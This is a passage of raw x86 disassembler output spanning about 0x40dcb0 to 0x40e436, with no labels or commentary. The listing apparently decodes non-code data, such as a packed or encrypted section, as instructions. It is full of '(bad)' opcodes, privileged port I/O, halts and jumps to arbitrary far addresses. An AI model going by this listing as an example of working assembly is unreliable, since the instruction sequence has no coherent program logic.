  40dcb0:	and    DWORD PTR [ebp-0x6eeba3cd],esi
  40dcb6:	pop    ebx
  40dcb7:	in     eax,0x63
  40dcb9:	or     eax,0xa23e1cab
  40dcbe:	sbb    eax,0xf788f478
  40dcc3:	jbe    0x40dcdc
  40dcc5:	mov    eax,ds:0x2c4b601a
  40dcca:	jno    0x40dc7b
  40dccc:	loopne 0x40dcfc
  40dcce:	add    bl,BYTE PTR ds:[edx-0x32]
  40dcd2:	stos   BYTE PTR es:[edi],al
  40dcd3:	jmp    0x935a:0xf83d9437
  40dcda:	loope  0x40dc8d
  40dcdc:	inc    esp
  40dcdd:	sahf   
  40dcde:	int    0x10
  40dce0:	into   
  40dce1:	sbb    al,0x2f
  40dce3:	inc    esp
  40dce4:	jmp    0x40dd62
  40dce6:	add    ch,al
  40dce8:	cld    
  40dce9:	xchg   DWORD PTR [ecx+0x7579979f],edx
  40dcef:	outs   dx,DWORD PTR ds:[esi]
  40dcf0:	mov    eax,0x652799bf
  40dcf5:	sti    
  40dcf6:	inc    edx
  40dcf7:	sub    ah,BYTE PTR [ebx]
  40dcf9:	push   eax
  40dcfa:	sbb    ecx,DWORD PTR [ebp+0x77]
  40dcfd:	push   eax
  40dcfe:	je     0x40dd2a
  40dd00:	imul   edi,DWORD PTR [edi],0x60
  40dd03:	popa   
  40dd04:	enter  0x6ca7,0x3b
  40dd08:	fist   DWORD PTR [eax]
  40dd0a:	bnd jns 0x40dcb4
  40dd0d:	cmp    BYTE PTR ss:[ebp-0x27],dh
  40dd11:	jns    0x40dd3a
  40dd13:	sub    eax,0x1155ee5
  40dd18:	xor    BYTE PTR [ebp+0x1f],al
  40dd1b:	fldcw  WORD PTR [ebp+0x7b0c4942]
  40dd21:	dec    edi
  40dd22:	aam    0x70
  40dd24:	(bad)  
  40dd25:	out    dx,al
  40dd26:	and    edx,DWORD PTR [esi+0x2438c601]
  40dd2c:	and    DWORD PTR [ebx+0x130fe7ea],edi
  40dd32:	stc    
  40dd33:	jl     0x40dd45
  40dd35:	fbstp  TBYTE PTR [edx-0x26]
  40dd38:	mov    ebx,0xf2285f41
  40dd3d:	fwait
  40dd3e:	ror    esi,cl
  40dd40:	push   ecx
  40dd41:	(bad)  
  40dd43:	call   0x58de5c32
  40dd48:	lds    ecx,FWORD PTR [ebp-0x53]
  40dd4b:	(bad)  
  40dd4c:	mov    ds:0x24f0a992,eax
  40dd51:	fsub   st(6),st
  40dd53:	test   BYTE PTR [edx],dh
  40dd55:	sti    
  40dd56:	dec    edi
  40dd57:	mov    bh,0x2a
  40dd59:	js     0x40dd41
  40dd5b:	inc    eax
  40dd5c:	sbb    al,0xe8
  40dd5e:	xchg   esp,eax
  40dd5f:	dec    ebx
  40dd60:	inc    ebp
  40dd61:	push   edx
  40dd62:	hlt    
  40dd63:	sub    ah,dl
  40dd65:	pop    edx
  40dd66:	dec    ecx
  40dd67:	adc    eax,0x792dedde
  40dd6c:	mov    cl,0x55
  40dd6e:	enter  0x4043,0xf1
  40dd72:	les    ecx,FWORD PTR [eax-0x2316b8e]
  40dd78:	and    cl,bh
  40dd7a:	jge    0x40dd33
  40dd7c:	jecxz  0x40dcff
  40dd7e:	add    eax,0xf90337c9
  40dd83:	and    DWORD PTR [esi],esp
  40dd85:	(bad)
  40dd88:	sar    BYTE PTR [eax],1
  40dd8a:	ror    BYTE PTR [ebx+0x75],cl
  40dd8d:	mov    eax,0x84d53fb4
  40dd92:	mov    DWORD PTR ds:0x9be8dae2,ebp
  40dd98:	lods   al,BYTE PTR ds:[esi]
  40dd99:	inc    esp
  40dd9a:	sbb    dl,dl
  40dd9c:	jbe    0x40ddc0
  40dd9e:	and    dh,al
  40dda0:	nop
  40dda1:	adc    BYTE PTR [eax],bh
  40dda3:	adc    eax,0x21329e69
  40dda8:	lahf   
  40dda9:	les    ebp,FWORD PTR [ebp+ebx*4-0x58]
  40ddad:	inc    ebp
  40ddae:	clc    
  40ddaf:	pusha  
  40ddb0:	mov    ebp,0x2219bdf3
  40ddb5:	push   es
  40ddb6:	sbb    BYTE PTR [esi-0x40],bl
  40ddb9:	test   DWORD PTR [ebx+0x76],0x4fc74eda
  40ddc0:	dec    edi
  40ddc1:	pop    edi
  40ddc2:	jle    0x40dd7a
  40ddc4:	mov    ebp,0xcb26e338
  40ddc9:	and    al,0xe4
  40ddcb:	cdq    
  40ddcc:	out    0x34,al
  40ddce:	add    DWORD PTR [ecx+0x396532de],eax
  40ddd4:	test   DWORD PTR [edi-0x3c],ebp
  40ddd7:	xor    al,0x4f
  40ddd9:	or     al,0x9c
  40dddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dddc:	xchg   ebx,eax
  40dddd:	call   0x1a68:0x6baa38c4
  40dde4:	mov    cl,0x4
  40dde6:	fbld   TBYTE PTR [esp+eax*1+0x4c7bce8e]
  40dded:	retf   
  40ddee:	jmp    0x6500d2c8
  40ddf3:	imul   edx,DWORD PTR [ebp+0x78],0xa1f7350f
  40ddfa:	or     DWORD PTR [edx-0x1d],ebp
  40ddfd:	jg     0x40de54
  40ddff:	loope  0x40de32
  40de01:	scas   al,BYTE PTR es:[edi]
  40de02:	fdivp  st(0),st
  40de04:	and    al,0xc5
  40de06:	(bad)  
  40de08:	sar    DWORD PTR [eax+ebp*4+0x35f02bdf],1
  40de0f:	scas   eax,DWORD PTR es:[edi]
  40de10:	out    dx,eax
  40de11:	and    eax,0x52452915
  40de16:	ror    DWORD PTR [edi],1
  40de18:	nop
  40de19:	in     al,0xa8
  40de1b:	mov    ecx,0x210f10e7
  40de20:	mov    BYTE PTR [ecx+0x415d8a9b],al
  40de26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de27:	sbb    dh,al
  40de29:	fwait
  40de2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de2b:	and    al,bl
  40de2d:	mov    ds:0xc1ec18ff,eax
  40de32:	stos   BYTE PTR es:[edi],al
  40de33:	dec    ecx
  40de34:	lods   al,BYTE PTR ds:[esi]
  40de35:	outs   dx,BYTE PTR ds:[esi]
  40de36:	jl     0x40de8c
  40de38:	adc    eax,0xfe12201d
  40de3d:	pop    es
  40de3e:	popa   
  40de3f:	push   0xffffffa9
  40de41:	repnz pop esp
  40de43:	(bad)  
  40de44:	out    dx,al
  40de45:	mov    ah,ch
  40de47:	and    eax,0x6516bfde
  40de4c:	fmul   DWORD PTR [edi]
  40de4e:	xor    bh,BYTE PTR [edx]
  40de50:	jl     0x40de4a
  40de52:	addr16 out dx,al
  40de54:	push   ds
  40de55:	jecxz  0x40de26
  40de57:	(bad)  
  40de58:	dec    ecx
  40de59:	loopne 0x40dea1
  40de5b:	mov    edx,0xcf37ab4f
  40de60:	mov    ebp,DWORD PTR [bx-0x58]
  40de64:	into   
  40de65:	dec    edx
  40de66:	jns    0x40decb
  40de68:	lea    eax,[ecx]
  40de6a:	dec    esi
  40de6b:	pushw  es
  40de6d:	loope  0x40de54
  40de6f:	call   FWORD PTR [ebx]
  40de71:	(bad)  
  40de72:	out    0x6b,al
  40de74:	add    DWORD PTR [edx+0x3c],esi
  40de77:	and    eax,0x37ef560c
  40de7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de7d:	jmp    0x3dbd13ca
  40de82:	sti    
  40de83:	imul   ecx,ebx,0x4
  40de86:	pop    edx
  40de87:	mov    WORD PTR [eax+0x2e],?
  40de8a:	jecxz  0x40de3d
  40de8c:	lahf   
  40de8d:	(bad)  
  40de8e:	pop    ss
  40de8f:	xor    BYTE PTR [eax+0x3b641916],ah
  40de95:	inc    esi
  40de96:	mov    eax,ds:0xdf349a36
  40de9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de9c:	out    0x6b,al
  40de9e:	cmp    eax,0xbef055c0
  40dea3:	pop    edx
  40dea4:	test   al,0x4
  40dea6:	xchg   edx,eax
  40dea7:	add    DWORD PTR [edx+edx*8+0x3798bd4e],esi
  40deae:	mul    BYTE PTR [edi-0x4d]
  40deb1:	jg     0x40debd
  40deb3:	int3   
  40deb4:	xchg   esi,eax
  40deb5:	leave  
  40deb6:	xor    eax,0x25f2c613
  40debb:	xor    BYTE PTR [esi],bl
  40debd:	aaa    
  40debe:	and    eax,eax
  40dec0:	aaa    
  40dec1:	xchg   esp,eax
  40dec2:	mov    edi,0xd8309301
  40dec7:	mov    dh,0x5
  40dec9:	jae    0x40deff
  40decb:	imul   BYTE PTR [ebx+ecx*1-0x64931f62]
  40ded2:	inc    ebp
  40ded3:	hlt    
  40ded4:	rol    dh,cl
  40ded6:	(bad)  
  40ded7:	pushf  
  40ded8:	arpl   WORD PTR [esi+edx*8-0x47f51e8f],dx
  40dedf:	pop    ss
  40dee0:	add    al,0xb1
  40dee2:	ja     0x40dee4
  40dee4:	sbb    BYTE PTR [ebx+0x16],dh
  40dee7:	xchg   edx,eax
  40dee8:	jno    0x40dec9
  40deea:	mov    edi,0x4a6bc5f
  40deef:	fisttp DWORD PTR [edi-0x39]
  40def2:	es in  al,dx
  40def4:	push   esi
  40def5:	cmc    
  40def6:	sub    eax,0x511fc123
  40defb:	sub    ebx,edi
  40defd:	add    al,0xe
  40deff:	xor    DWORD PTR [ebp+0x320bb95d],esi
  40df05:	or     dl,BYTE PTR [edi-0x253cbcde]
  40df0b:	fidiv  WORD PTR [ebp-0x2a04c2b9]
  40df11:	mov    ecx,0xa5ef6fff
  40df16:	dec    esp
  40df17:	xchg   ebx,eax
  40df18:	jb     0x40deae
  40df1a:	mov    edi,0x797d3c46
  40df1f:	fild   QWORD PTR [esi-0x59d36654]
  40df25:	add    DWORD PTR [esi-0x26],esi
  40df28:	sub    bl,BYTE PTR [eax+eiz*1-0x19]
  40df2c:	and    esp,DWORD PTR [edx]
  40df2e:	cmc    
  40df2f:	cmc    
  40df30:	jg     0x40df64
  40df32:	xor    ch,dl
  40df34:	hlt    
  40df35:	ins    BYTE PTR es:[edi],dx
  40df36:	jmp    0x40df3f
  40df38:	sub    eax,0xe316852e
  40df3d:	mov    eax,ds:0x5cf9ee13
  40df42:	cld    
  40df43:	ja     0x40dfb3
  40df45:	inc    esi
  40df46:	dec    ebx
  40df47:	cs and dl,bh
  40df4a:	hlt    
  40df4b:	lods   eax,DWORD PTR ds:[esi]
  40df4c:	jl     0x40df84
  40df4e:	inc    ebx
  40df4f:	int3   
  40df50:	pop    ecx
  40df51:	sbb    DWORD PTR [ebp+edi*1+0x3179f402],0xfffffffc
  40df59:	add    al,0x3c
  40df5b:	push   edi
  40df5c:	add    ebp,DWORD PTR [esi-0x70f8018c]
  40df62:	in     eax,dx
  40df63:	mov    fs,WORD PTR [ebx]
  40df65:	xor    al,0x84
  40df67:	and    DWORD PTR [ecx-0x4ffa64f1],ebp
  40df6d:	cmp    bh,dh
  40df6f:	mov    edi,0x2a1f509f
  40df74:	mov    ecx,0x440c214c
  40df79:	ret    0xac01
  40df7c:	cmp    BYTE PTR [edx+0x3b],dl
  40df7f:	adc    eax,0xc0a8fc29
  40df84:	inc    esp
  40df85:	in     eax,0xfb
  40df87:	pusha  
  40df88:	sub    ax,0xed47
  40df8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df8d:	xor    al,0xf2
  40df8f:	nop
  40df90:	clc    
  40df91:	into   
  40df92:	les    esi,FWORD PTR [esi]
  40df94:	test   eax,0xb94c63da
  40df99:	sbb    edi,DWORD PTR [eax-0x44961ead]
  40df9f:	in     al,dx
  40dfa0:	adc    ecx,DWORD PTR [edi-0x672203ec]
  40dfa6:	cli    
  40dfa7:	dec    esi
  40dfa8:	mov    al,ds:0xe48d4d1f
  40dfad:	push   esp
  40dfae:	(bad)  
  40dfb0:	xchg   edx,eax
  40dfb1:	jmp    0xab2c84b6
  40dfb6:	mov    bl,0x18
  40dfb8:	push   ss
  40dfb9:	push   ecx
  40dfba:	fsub   QWORD PTR [ebx-0x1062e188]
  40dfc0:	pop    esp
  40dfc1:	(bad)  
  40dfc2:	push   esi
  40dfc3:	(bad)  
  40dfc4:	rcr    dl,0xa7
  40dfc7:	xchg   ebp,eax
  40dfc8:	and    BYTE PTR [edx+0x7],dl
  40dfcb:	xor    eax,0xbf0abfbd
  40dfd0:	and    DWORD PTR [ebx],0x97f2e0f4
  40dfd6:	ins    BYTE PTR es:[edi],dx
  40dfd7:	jmp    0xeed7:0x19017e15
  40dfde:	lock sub al,0xfe
  40dfe1:	rcl    BYTE PTR ds:[ecx+0x7b],0x64
  40dfe6:	lods   al,BYTE PTR ds:[esi]
  40dfe7:	pop    eax
  40dfe8:	push   eax
  40dfe9:	ja     0x40dfe2
  40dfeb:	mov    ds:0x7d84af9b,al
  40dff0:	pusha  
  40dff1:	sbb    BYTE PTR [ebx+0x3f6fe0d3],cl
  40dff7:	ins    BYTE PTR es:[edi],dx
  40dff8:	sbb    BYTE PTR [esi+edi*8],0x52
  40dffc:	cld    
  40dffd:	and    ah,dl
  40dfff:	sbb    eax,0x65f8ab90
  40e004:	es pop eax
  40e006:	ficom  DWORD PTR [ebx-0x721d4eac]
  40e00c:	mov    esp,0x8fcf7cd8
  40e011:	loop   0x40e03a
  40e013:	lods   eax,DWORD PTR ds:[esi]
  40e014:	dec    edi
  40e015:	fisttp DWORD PTR [ebx]
  40e017:	add    eax,0xd30d59a4
  40e01c:	push   ecx
  40e01d:	and    eax,0xddf05990
  40e022:	sti    
  40e023:	adc    ah,BYTE PTR [ebx-0x38]
  40e026:	and    eax,0x7f06ebad
  40e02b:	jbe    0x40e078
  40e02d:	(bad)  
  40e02e:	xchg   esi,eax
  40e02f:	inc    ebp
  40e030:	call   0xfd61:0x58ecd4d
  40e037:	mov    ch,0x45
  40e039:	jo     0x40e084
  40e03b:	and    ebp,DWORD PTR [esi-0x15]
  40e03e:	jo     0x40e007
  40e040:	pop    ebp
  40e041:	sbb    DWORD PTR [ecx-0x71],esp
  40e044:	imul   edi,DWORD PTR [ebp+0x14],0xf55b4f87
  40e04b:	out    dx,eax
  40e04c:	push   0x75
  40e04e:	loope  0x40e05b
  40e050:	cmp    bh,0x7c
  40e053:	call   0x14e9:0x8c844c5f
  40e05a:	xchg   edi,eax
  40e05b:	xchg   esp,eax
  40e05c:	popa   
  40e05d:	arpl   WORD PTR [edx],bp
  40e05f:	sub    eax,0x5b8a5a7c
  40e064:	or     DWORD PTR [ebx+0x39],0xffffff8a
  40e068:	cs and ecx,esp
  40e06b:	stos   DWORD PTR es:[edi],eax
  40e06c:	adc    dl,BYTE PTR [eax*2+0x4e01b7bd]
  40e073:	dec    ecx
  40e074:	popf   
  40e075:	pop    es
  40e076:	mov    bh,0x9d
  40e078:	inc    edx
  40e079:	dec    eax
  40e07a:	ret    
  40e07b:	mov    dl,0x3b
  40e07d:	xor    ecx,edx
  40e07f:	into   
  40e080:	hlt    
  40e081:	ret    
  40e082:	mov    ecx,0xc9742bba
  40e087:	ja     0x40e0b1
  40e089:	pop    esi
  40e08a:	ror    DWORD PTR [ebp+0x3b4dbe23],1
  40e090:	in     eax,0x7b
  40e092:	je     0x40e0f9
  40e094:	int    0xa
  40e096:	cmp    BYTE PTR [esi+0x4936a9bc],0xa2
  40e09d:	sbb    bh,BYTE PTR [esi]
  40e09f:	popf   
  40e0a0:	gs xor ebp,ebp
  40e0a3:	stos   DWORD PTR es:[edi],eax
  40e0a4:	shl    BYTE PTR ds:0x7e6643d3,cl
  40e0aa:	js     0x40e0a3
  40e0ac:	call   0xa0eeb51d
  40e0b1:	jo     0x40e0e7
  40e0b3:	inc    ebp
  40e0b4:	add    edi,DWORD PTR [ebx-0x70]
  40e0b7:	scas   al,BYTE PTR es:[edi]
  40e0b8:	jae    0x40e123
  40e0ba:	dec    esp
  40e0bb:	popf   
  40e0bc:	mov    ecx,eax
  40e0be:	dec    edx
  40e0bf:	sti    
  40e0c0:	test   al,ah
  40e0c2:	fisubr DWORD PTR [ecx]
  40e0c4:	jno    0x40e07b
  40e0c6:	leave  
  40e0c7:	or     ebx,DWORD PTR [eax+eiz*2+0x5d919527]
  40e0ce:	popf   
  40e0cf:	pop    ecx
  40e0d0:	and    ah,BYTE PTR [esi+0x20]
  40e0d3:	push   ebp
  40e0d4:	sub    al,0x1a
  40e0d6:	ins    DWORD PTR es:[edi],dx
  40e0d7:	call   0x255c:0x1aa9993
  40e0de:	rol    BYTE PTR [esi+0x26],0x8
  40e0e2:	rol    BYTE PTR [ebp+0x272ce849],1
  40e0e8:	push   ecx
  40e0e9:	dec    ebp
  40e0ea:	push   0xa0b3b552
  40e0ef:	mov    ah,0x33
  40e0f1:	dec    edx
  40e0f2:	mov    cl,0x7a
  40e0f4:	pushf  
  40e0f5:	fdiv   DWORD PTR [edx-0x552da03a]
  40e0fb:	pop    edi
  40e0fc:	test   dh,bl
  40e0fe:	lods   al,BYTE PTR ds:[esi]
  40e0ff:	outs   dx,BYTE PTR ds:[esi]
  40e100:	and    eax,0xd847f6de
  40e105:	cli    
  40e106:	jmp    0x3925:0x34bd9f8
  40e10d:	les    esp,FWORD PTR [eax+0x3f3514f3]
  40e113:	adc    BYTE PTR [eax],bh
  40e115:	out    dx,eax
  40e116:	repnz mov al,ds:0x39928e3f
  40e11c:	push   es
  40e11d:	mov    edx,0xb95c6a3a
  40e122:	fadd   DWORD PTR ds:0x1e11b883
  40e128:	jbe    0x40e1a8
  40e12a:	or     al,BYTE PTR [esp+eax*8]
  40e12d:	lock imul ebp,esi,0x8078f6d1
  40e134:	test   DWORD PTR ds:0x42b2ac3b,edx
  40e13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13b:	test   BYTE PTR [edx],cl
  40e13d:	pop    ds
  40e13e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e13f:	pop    ebp
  40e140:	ja     0x40e1b4
  40e142:	xor    ch,BYTE PTR [eax+ebx*4+0x7215061]
  40e149:	lahf   
  40e14a:	loop   0x40e121
  40e14c:	or     al,0xeb
  40e14e:	push   es
  40e14f:	mov    esi,0x8eb7dc8d
  40e154:	jle    0x40e116
  40e156:	add    DWORD PTR [edx-0x1623f5b],ecx
  40e15c:	mov    bh,0xdf
  40e15f:	cdq    
  40e160:	inc    edx
  40e161:	jmp    0x40e1a3
  40e163:	pop    edi
  40e164:	or     al,0xa7
  40e166:	pop    ebp
  40e167:	(bad)  
  40e168:	mov    ebx,gs
  40e16a:	in     al,0x37
  40e16c:	repnz cmp BYTE PTR [esi+esi*4+0x6],cl
  40e171:	push   edi
  40e172:	mov    bl,0xa3
  40e174:	outs   dx,BYTE PTR ds:[esi]
  40e175:	outs   dx,DWORD PTR ds:[esi]
  40e176:	(bad)  
  40e178:	loopne 0x40e19f
  40e17a:	add    DWORD PTR [edi+0x17],eax
  40e17d:	add    eax,0xb515ed5f
  40e182:	fisubr DWORD PTR [edi]
  40e184:	sbb    BYTE PTR [edx+0x7a83c194],bl
  40e18a:	test   eax,0x245679b5
  40e18f:	sbb    eax,0x18e3612f
  40e194:	lahf   
  40e195:	mov    ch,0x5d
  40e197:	mov    ebx,0x8a69c9ca
  40e19c:	xor    edx,esp
  40e19e:	(bad)  
  40e19f:	mov    ebx,0xad7e5684
  40e1a4:	pop    ecx
  40e1a5:	inc    eax
  40e1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a8:	jmp    0xf9c8f84c
  40e1ad:	mov    cl,0x8f
  40e1af:	daa    
  40e1b0:	int    0x7e
  40e1b2:	lods   eax,DWORD PTR ds:[esi]
  40e1b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1b4:	sub    eax,DWORD PTR [edx]
  40e1b6:	(bad)  
  40e1b7:	out    dx,al
  40e1b8:	mov    WORD PTR [edi],gs
  40e1ba:	push   esi
  40e1bb:	inc    edi
  40e1bc:	xor    cl,BYTE PTR [eax]
  40e1be:	add    DWORD PTR ss:[esi-0x4b],ebx
  40e1c2:	jns    0x40e1c0
  40e1c4:	ss inc edx
  40e1c6:	dec    esi
  40e1c7:	dec    ecx
  40e1c8:	(bad)  
  40e1c9:	aaa    
  40e1ca:	aas    
  40e1cb:	inc    edi
  40e1cc:	dec    esp
  40e1cd:	sahf   
  40e1ce:	mov    ds:0x3d49e73b,al
  40e1d3:	bound  edx,QWORD PTR [edi+0x33]
  40e1d6:	sbb    al,0x18
  40e1d8:	xchg   ebx,eax
  40e1d9:	xor    ebx,DWORD PTR [edx-0x1af22713]
  40e1df:	(bad)  
  40e1e0:	push   esp
  40e1e1:	push   ecx
  40e1e2:	inc    esi
  40e1e3:	mov    cl,0xf1
  40e1e5:	cmp    cl,BYTE PTR [ebx+0x15]
  40e1e8:	pop    esi
  40e1e9:	or     eax,0xefbcccf8
  40e1ee:	jp     0x40e1d1
  40e1f0:	cmp    esp,esp
  40e1f2:	imul   eax,DWORD PTR [esp+eax*4-0x6b],0xb1dea0d0
  40e1fa:	imul   esi,DWORD PTR [edi],0xffffffd5
  40e1fd:	imul   esp,DWORD PTR [ebp+0x5d66bd4a],0xb9f26d1c
  40e207:	fucomp st(5)
  40e209:	shr    DWORD PTR [edi+0x1d4d5580],cl
  40e20f:	xor    eax,0xa239a886
  40e214:	and    dh,BYTE PTR [ebx-0x7d10d1a5]
  40e21a:	inc    esi
  40e21b:	push   edx
  40e21c:	test   eax,0xe6636e68
  40e221:	inc    esp
  40e222:	xor    DWORD PTR [edx+0x388a09f0],0xffffffea
  40e229:	mov    cl,0x0
  40e22b:	pop    eax
  40e22c:	(bad)  
  40e22d:	test   eax,0x24e8f3e6
  40e232:	mov    ah,0xd1
  40e234:	pop    eax
  40e235:	xchg   edx,eax
  40e236:	mov    edx,0x14e50d39
  40e23b:	xchg   DWORD PTR [esi+0x55],esp
  40e23e:	xor    eax,0xa848db1e
  40e243:	mov    ds:0x8ed42475,al
  40e248:	sub    BYTE PTR [eax],bl
  40e24a:	test   ah,0x2d
  40e24d:	sub    eax,0x92a97bd4
  40e252:	jl     0x40e2b3
  40e254:	retf   0x6ab9
  40e257:	mov    bh,BYTE PTR [edi-0x37]
  40e25a:	push   eax
  40e25b:	(bad)  
  40e25c:	int    0xdf
  40e25e:	pop    edi
  40e25f:	pop    ebx
  40e260:	stc    
  40e261:	stos   DWORD PTR es:[edi],eax
  40e262:	in     al,0x33
  40e264:	(bad)  
  40e265:	(bad)  
  40e266:	xchg   edx,eax
  40e267:	mov    ch,BYTE PTR [edx+0x8]
  40e26a:	neg    BYTE PTR [eax]
  40e26c:	nop
  40e26d:	or     BYTE PTR [edi],al
  40e26f:	jno    0x40e28c
  40e271:	sub    al,0x1c
  40e273:	push   cs
  40e274:	repnz scas al,BYTE PTR es:[edi]
  40e276:	add    al,BYTE PTR [edi-0x3d2b1c3f]
  40e27c:	push   ebx
  40e27d:	addr16 and ax,0xaf8a
  40e282:	les    ecx,FWORD PTR [ebx]
  40e284:	imul   edx,DWORD PTR [eax+0xa74d76],0x2b3e7e82
  40e28e:	sbb    bh,BYTE PTR [edi+0x76c11b36]
  40e294:	arpl   WORD PTR [esp+edi*8],sp
  40e297:	retf   
  40e298:	inc    ecx
  40e299:	imul   edi,ebx,0xffffffcb
  40e29c:	test   DWORD PTR [eax],0x8072e62a
  40e2a2:	push   esi
  40e2a3:	out    dx,eax
  40e2a4:	sbb    DWORD PTR [edx+0x56cff065],ebp
  40e2aa:	sbb    dl,0xd0
  40e2ad:	cmp    bl,BYTE PTR [ebp+0x7d9f51b2]
  40e2b3:	out    0x96,al
  40e2b5:	jp     0x40e289
  40e2b7:	pop    edx
  40e2b8:	aas    
  40e2b9:	stc    
  40e2ba:	out    dx,al
  40e2bb:	pop    edi
  40e2bc:	mov    ebp,0x809c812c
  40e2c1:	loope  0x40e251
  40e2c3:	sub    edx,edx
  40e2c5:	jbe    0x40e2cc
  40e2c7:	daa    
  40e2c8:	aas    
  40e2c9:	sub    al,0xce
  40e2cb:	iret   
  40e2cc:	lock xchg edx,eax
  40e2ce:	add    al,0xa5
  40e2d0:	sub    BYTE PTR [ebx-0x5e],cl
  40e2d3:	sub    DWORD PTR [ebx],ebp
  40e2d5:	cmp    al,0xb
  40e2d7:	mov    al,0x82
  40e2d9:	das    
  40e2da:	jg     0x40e29a
  40e2dc:	loopne 0x40e356
  40e2de:	in     al,dx
  40e2df:	dec    ebx
  40e2e0:	data16 and BYTE PTR [eax],al
  40e2e3:	out    dx,al
  40e2e4:	inc    eax
  40e2e5:	mov    al,0xe9
  40e2e7:	sbb    ecx,esi
  40e2e9:	xor    BYTE PTR [edi+esi*1],dl
  40e2ec:	mov    esi,0x422d55a4
  40e2f1:	pusha  
  40e2f2:	and    eax,0xc8f28ead
  40e2f7:	mov    ch,0x1b
  40e2f9:	mov    dl,BYTE PTR [ebx]
  40e2fb:	rcr    bl,cl
  40e2fd:	push   ebp
  40e2fe:	inc    esp
  40e2ff:	ficom  WORD PTR [edi+ecx*8-0xc]
  40e303:	mov    esi,0x5580eeae
  40e308:	adc    DWORD PTR [ecx+0x46850739],ebp
  40e30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e30f:	inc    esi
  40e310:	(bad)  
  40e311:	xchg   edx,eax
  40e312:	aad    0x6d
  40e314:	vmaxss xmm6,xmm7,DWORD PTR [eax+0x37]
  40e319:	sub    ah,BYTE PTR [ecx+0x59d07b1e]
  40e31f:	jecxz  0x40e2d6
  40e321:	push   ds
  40e322:	in     al,dx
  40e323:	sbb    eax,DWORD PTR [esi+ebp*2-0x178cc9c2]
  40e32a:	add    al,0xc3
  40e32c:	xchg   edi,eax
  40e32d:	rcr    DWORD PTR [edx+0x23],cl
  40e330:	cmp    esi,eax
  40e332:	xchg   esi,eax
  40e333:	xchg   edx,edi
  40e335:	into   
  40e336:	xor    DWORD PTR [edx+edi*4+0x7b2323d9],0x71d9c409
  40e341:	retf   
  40e342:	and    esi,ebx
  40e344:	cmp    ch,BYTE PTR [ecx+0x6b]
  40e347:	mov    bl,0x9b
  40e349:	iret   
  40e34a:	pop    esi
  40e34b:	int    0xcb
  40e34d:	push   esi
  40e34e:	add    edi,DWORD PTR [ebx-0x270b3d4]
  40e354:	cli    
  40e355:	ret    0x368c
  40e358:	mov    eax,ds:0xd28f8d9d
  40e35d:	lock jns 0x40e334
  40e360:	xchg   ebp,eax
  40e361:	jmp    0x1694:0x6f50d655
  40e368:	(bad)  
  40e369:	fadd   QWORD PTR ds:0x703f92af
  40e36f:	push   es
  40e370:	sbb    edi,ecx
  40e372:	mov    esi,0xb14b2892
  40e377:	pop    ebx
  40e378:	aam    0x54
  40e37a:	rcr    DWORD PTR [ebx],1
  40e37c:	test   DWORD PTR [ecx+eax*4+0x3be7419a],ecx
  40e383:	rcr    DWORD PTR [ecx-0x1c],0x29
  40e387:	mov    ecx,cs
  40e389:	sub    eax,0x1b240952
  40e38e:	pop    eax
  40e38f:	push   es
  40e390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e391:	cmp    dl,BYTE PTR [edi+0x56f2c30f]
  40e397:	cmp    DWORD PTR [ebp-0x36],edi
  40e39a:	fistp  WORD PTR [ebp+0x18c2d394]
  40e3a0:	xchg   BYTE PTR [ecx],cl
  40e3a2:	sub    BYTE PTR [edi-0x4df0043c],al
  40e3a8:	(bad)  
  40e3a9:	jmp    0x40e333
  40e3ab:	jp     0x40e3d5
  40e3ad:	pusha  
  40e3ae:	mov    ch,0x18
  40e3b0:	das    
  40e3b1:	mov    al,0x44
  40e3b3:	in     eax,dx
  40e3b4:	push   edx
  40e3b5:	shl    BYTE PTR [bp+di-0x2],0xcb
  40e3ba:	push   ebp
  40e3bb:	pop    es
  40e3bc:	or     bl,BYTE PTR [ebx-0x72fc008]
  40e3c2:	or     DWORD PTR [ebx-0x63],esi
  40e3c5:	jne    0x40e34e
  40e3c7:	dec    esi
  40e3c8:	mov    esi,0xb694d63c
  40e3cd:	aas    
  40e3ce:	loopne 0x40e3cc
  40e3d0:	loope  0x40e39a
  40e3d2:	aas    
  40e3d3:	call   0xa1a4:0xf880f375
  40e3da:	pop    ss
  40e3db:	fistp  DWORD PTR fs:[ebx]
  40e3de:	aam    0x7b
  40e3e0:	into   
  40e3e1:	clc    
  40e3e2:	inc    edx
  40e3e3:	xchg   ecx,eax
  40e3e4:	pop    edx
  40e3e5:	pop    esp
  40e3e6:	test   al,0x71
  40e3e8:	loope  0x40e422
  40e3ea:	add    eax,0x3e22294e
  40e3ef:	out    dx,al
  40e3f0:	jge    0x40e3e3
  40e3f2:	jg     0x40e38a
  40e3f4:	xchg   BYTE PTR [eax+0x2b],dl
  40e3f7:	cmp    BYTE PTR [eax-0x9],dl
  40e3fa:	imul   edx,DWORD PTR [eax+0x62],0x57
  40e3fe:	xor    BYTE PTR [esi],bl
  40e400:	pop    ebx
  40e401:	popf   
  40e402:	ficomp DWORD PTR [eax-0x69]
  40e405:	test   bl,cl
  40e407:	mov    esi,cs
  40e409:	cld    
  40e40a:	jge    0x40e46d
  40e40c:	fild   QWORD PTR [ecx-0x71]
  40e40f:	xchg   dh,dh
  40e411:	mov    eax,0xfaee9a6a
  40e416:	adc    ch,BYTE PTR [edx+eax*2]
  40e419:	or     BYTE PTR [esi+ecx*1-0x6b],dh
  40e41d:	lea    eax,[edi+0x3f6dc6fd]
  40e423:	out    0xb6,al
  40e425:	and    BYTE PTR [ecx-0x2a],0xa6
  40e429:	scas   eax,DWORD PTR es:[edi]
  40e42a:	(bad)  
  40e42b:	fistp  DWORD PTR [eax]
  40e42d:	shr    DWORD PTR [ecx-0x5daad5cb],0xc1
  40e434:	iret   
  40e435:	push   esp
  40e436:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
